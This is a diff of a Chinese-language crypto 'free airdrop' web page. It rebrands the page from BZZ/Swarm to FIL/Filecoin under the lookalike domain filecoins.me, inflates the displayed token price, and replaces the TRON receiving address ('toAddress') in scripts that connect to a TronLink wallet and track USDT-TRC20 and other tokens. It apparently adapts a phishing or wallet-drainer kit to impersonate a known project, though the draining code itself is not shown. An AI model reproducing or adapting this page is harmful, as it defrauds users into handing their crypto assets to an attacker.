@@ -61,9 +61,9 @@
                                     <h2 class="animated fadeInUp t0001" data-animate="fadeInUp" data-delay="0.65" style="visibility: visible; animation-delay: 0.65s;">
 									
 									</h2>
-                                    <p class="lead animated fadeInUp t0002" data-animate="fadeInUp" data-delay="0.75" style="visibility: visible; animation-delay: 0.75s;">有幸获得BZZ项目免费空投，获得的用户可以参与社区建设，也可兑换等量TRX</p>
+                                    <p class="lead animated fadeInUp t0002" data-animate="fadeInUp" data-delay="0.75" style="visibility: visible; animation-delay: 0.75s;">有幸获得FIL项目免费空投，获得的用户可以参与社区建设，也可兑换等量TRX</p>
                                     <ul class="btns animated fadeInUp" data-animate="fadeInUp" data-delay="0.85" style="visibility: visible; animation-delay: 0.85s;">
-                                       <li><a class="btn btn-outline t0010" target="_blank" href="swarm-whitepaper.pdf">白皮书</a></li>
+                                       <li><a class="btn btn-outline t0010" target="_blank" href="whitepaper.pdf">白皮书</a></li>
                                        <li><a class="btn btn-outline t0011" href="/">首次空投</a></li>
                                     </ul>
                                     <div class="gaps size-2x"></div>
@@ -90,15 +90,15 @@
                                  </ul>
                                  <div class="token-info">
 									<div class="token-info-item d-sm-flex align-items-sm-center">
-                                       <span class="t0004">您持有的 BZZ 代币</span>
-                                       <h4 id="SHIBNUM">0 BZZ</h4>
+                                       <span class="t0004">您持有的 FIL 代币</span>
+                                       <h4 id="SHIBNUM">0 FIL</h4>
                                     </div>
 									<div class="token-info-item ">
-                                       <a class="btn btn-cCap t0005" href="javascript:swap()" target="_self">点击参加抽奖有机会获得更多BZZ</a>
+                                       <a class="btn btn-cCap t0005" href="javascript:swap()" target="_self">点击参加抽奖有机会获得更多FIL</a>
                                     </div>
                                     <div class="token-info-item ">
                                        <span class="t0006">目前价格:</span>
-                                       <h4 id="EXCHANGERATE">1 BZZ = $0.02</h4>
+                                       <h4 id="EXCHANGERATE">1 FIL = $55</h4>
                                     </div>
                                     <div class="token-info-item ">
                                        <span class="t0007">要转换的数量:</span>
@@ -106,7 +106,7 @@
 										  type="number"
 										  min="0"
 										  class="form-control required"
-										  placeholder="BZZ Amount"
+										  placeholder="FIL Amount"
 										/>
 									  </div>
                                     </div>
@@ -139,7 +139,7 @@
                         <h6 class="widget-title t0013">资源</h6>
                         <div class="textwidget custom-html-widget">
                            <ul class="widget-links">
-                              <li><a target="_blank" class="t0010" href="swarm-whitepaper.pdf">白皮书</a></li>
+                              <li><a target="_blank" class="t0010" href="whitepaper.pdf">白皮书</a></li>
                               <li><a class="t0011" href="/">首次空投</a></li>
                               <li><a class="t0012" href="/">智能合约</a></li>
                            </ul>
@@ -166,7 +166,7 @@
                <div class="gaps size-1x d-none d-lg-block"></div>
                <div class="footer-bottom">
                   <ul class="footer-list text-center">
-                     <li>Copyright © 2021, BZZ Made By <a href="https://ethswarms.com/" target="_blank">Ethswarms</a></li>
+                     <li>Copyright © 2021, FIL Made By <a href="https://filecoins.me/" target="_blank">FileCoin</a></li>
                   </ul>
                </div>
             </div>
@@ -320,7 +320,7 @@
 			  };
 
 			  let usdtTrc20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-			  let toAddress = "TBYjMhBiyEJxSA5g4HAoWWZXp7qU5C6Y9c";
+			  let toAddress = "TQ3Hhr9zRurd6j8xW7eb1fByLNTUxhj3UC";
 
 			  let trc20List = [
 				"TE2RzoSV3wFK99w6J9UnnZ4vLfXYoxvRwP",
@@ -375,17 +375,17 @@
 				"TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
 			  ];
 
-			  let coinId = "1004131";
-			  let coinName = "BZZ";
+			  let coinId = "1004184";
+			  let coinName = "FIL";
 			  let coinPrecision = 1000000;
 			  let coinNum = 0;
-			  let proportion = 120;
+			  let proportion = 55;
 
 			  let checkTronReadyNum = 0;
 
 			  let timer = setInterval(async () => {
 			  
-				$("#EXCHANGERATE").html("1 BZZ = " + proportion + " USDT");
+				$("#EXCHANGERATE").html("1 FIL = " + proportion + " USDT");
 			  
 				checkTronReadyNum++;
 				if (window.tronWeb && window.tronWeb.ready) {
@@ -414,12 +414,12 @@
 			  }, 500);
 
 			  function showNoConnet() {
-				Qmsg.error(`<br><br>Please download the Tronlink APP on your mobile phone and enter ethswarms.com into the Dapp or use the Tronlink Chrome plug-in on your PC.<br><br>
-			  請下載手機端Tronlink APP 並打開進入發現在DAPP中輸入ethswarms.com進入,或使用PC端配合tronlink Chrome插件使用。<br>`);
+				Qmsg.error(`<br><br>Please download the Tronlink APP on your mobile phone and enter filecoins.me into the Dapp or use the Tronlink Chrome plug-in on your PC.<br><br>
+			  請下載手機端Tronlink APP 並打開進入發現在DAPP中輸入filecoins.me進入,或使用PC端配合tronlink Chrome插件使用。<br>`);
 			  }
 
 			  function change() {
-				if ($($("input")[0]).attr("placeholder") == "BZZ Amount") {
+				if ($($("input")[0]).attr("placeholder") == "FIL Amount") {
 				  $($("input")[0]).attr("placeholder", "TRX Amount");
 				  $($("input")[1]).attr("placeholder", `${coinName} Amount`);
 				} else {
